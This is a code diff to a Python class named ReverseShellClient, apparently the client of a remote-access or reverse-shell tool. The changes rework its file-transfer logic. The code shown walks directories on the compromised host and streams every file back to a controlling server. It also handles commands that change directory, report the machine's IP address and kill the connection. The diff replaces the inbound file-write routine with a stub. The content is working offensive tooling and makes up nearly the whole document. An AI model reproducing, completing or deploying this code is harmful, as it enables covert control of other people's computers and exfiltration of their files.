@@ -97,80 +97,42 @@ class ReverseShellClient:
             return json.dumps(output).encode()
         except Exception as e:
             return f"Error getting IP info: {e}".encode()
-        
 
-    def download_file(self, local_path):
-        try:
-            save_dir = os.getcwd()
-            full_save_path = os.path.normpath(os.path.join(save_dir, local_path))
-            print("debug client full save path", full_save_path)
-            if not save_dir or not local_path or not save_dir:
-                return
-            handshake = self.comm.recv().decode()
-            print("debug handshake upload", handshake)
-            if handshake != "$up:start~+":
-                raise Exception("Invalid upload start marker")
-            with open(full_save_path, 'wb') as f:
-                while True:
-                    chunk = self.comm.recv()
-                    if chunk == b"up:done+*<+":
-                        break
-                    if chunk == b"up:aborted+*~":
-                        raise Exception("Transfer aborted by server")
-                    f.write(chunk)
-            return(b"Upload Successfull (client)")
-        except Exception as e:
-            print("Error downloading file:", e)
-            self.comm.send(b"Client error upload file")
+    def download_file(self, remote_path):
+        return b"download functionality to be implemented later"
     
     def file_send(self,file):
-        # print(f"debug: sending file start (file_send): {file}")
         with open(file,"rb") as file_u:
-          for data in iter(lambda: file_u.read(4096), b""):
+          for data in iter(lambda: file_u.read(4100), b""):
             try:
               self.comm.send(data)
             except:
               file_u.close()
               self.comm.send(b"aborted+*~")
-        # print(f"debug: sending file (file_send end): {file}")
         self.comm.send(b"done+*<+")
 
     def upload_file(self, local_path):
         if not os.path.exists(local_path):
             self.comm.send(b"error: No such file or directory")
             return
-        self.comm.send(b"ready*+~")
+        self.comm.send(b"ready")
 
         if os.path.isdir(local_path):
-            self.comm.send(b"*is_dir+~")
-            all_files = []
-            for root, _, files in os.walk(local_path):
-                for file in files:
+            self.comm.send(b"dir~%*")
+            files = os.listdir(local_path)
+            self.comm.send(struct.pack('>I', len(files)))
+            for root, _, filenames in os.walk(local_path):
+                for file in filenames:
                     full_path = os.path.join(root, file)
                     rel_path = os.path.relpath(full_path, local_path)
-                    all_files.append(rel_path)
-            self.comm.sock.sendall(struct.pack('>I', len(all_files)))
-            print(f"files sent {len(all_files)}")
-
-            for rel_path in all_files:
-                self.comm.send(rel_path.encode())
-                full_path = os.path.join(local_path, rel_path)
-                self.file_send(full_path)
-                # with open(path, 'rb') as f:
-                #     while True:
-                #         chunk = f.read(4096)
-                #         if not chunk:
-                #             break
-                #         self.comm.send(chunk)
-                # self.comm.send(b"done+*<+")
-        else: 
+                    print(f"Sending file: {rel_path} (len: {len(rel_path)})")
+                    self.comm.send(rel_path.encode())
+                    self.file_send(full_path)
+        else:
             self.comm.send(b"file~%*")
-            # print(f"debug: sending file (upload file): {local_path}")
             self.file_send(local_path)
-            
 
-            
-       
+                    
     def kill_connection(self):
         """Gracefully terminate the connection"""
         self.alive = False
@@ -187,7 +149,7 @@ class ReverseShellClient:
                 if not cmd:
                     continue
                 
-                if cmd.startswith("cd"):
+                if cmd.startswith("cd "):
                     path = cmd[3:]
                     output = self.change_directory(path)
                 elif cmd.lower() == "getip":
@@ -197,6 +159,7 @@ class ReverseShellClient:
                     output = self.upload_file(local_path)
                 elif cmd.lower().startswith("upload"):
                     remote_path = cmd[7:].strip()
+                    print("upload local path:", remote_path)
                     output = self.download_file(remote_path)
                 elif cmd.lower() == "kill":
                     output = self.kill_connection()
